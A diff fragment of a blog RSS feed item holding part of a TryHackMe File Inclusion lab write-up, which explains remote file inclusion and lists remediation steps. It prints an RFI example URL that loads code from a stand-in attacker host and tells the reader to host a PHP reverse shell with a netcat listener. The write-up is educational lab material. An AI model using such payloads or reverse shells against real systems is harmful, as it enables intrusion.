+&lt;p&gt;First, the attacker injects the malicious URL, which points to the attacker’s server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.&lt;/p&gt;
+
+&lt;p&gt;Visit the following lab URL: http://10.10.77.73/playground.php to try out an RFI attack.&lt;/p&gt;
+
+&lt;p&gt;Save and host a php reverse shell from pentestmonkey and setup a netcat listener.&lt;/p&gt;
+
+&lt;h3 id=&quot;task-7-remediation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 7 Remediation&lt;/h3&gt;
+
+&lt;p&gt;As a developer, it’s important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Keep system and services, including web application frameworks, updated with the latest version.
+2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
+3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
+4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn&apos;t need them, such as allow_url_fopen on and allow_url_include.
+5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
+6. Never trust user input, and make sure to implement proper input validation against file inclusion.
+7. Implement whitelisting for file names and locations as well as blacklisting.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Thu, 09 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-File-Inclusion</link>
+        <link href="http://localhost:4000/TryHackMe-File-Inclusion"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-File-Inclusion</guid>
       </item>
     
   </channel>
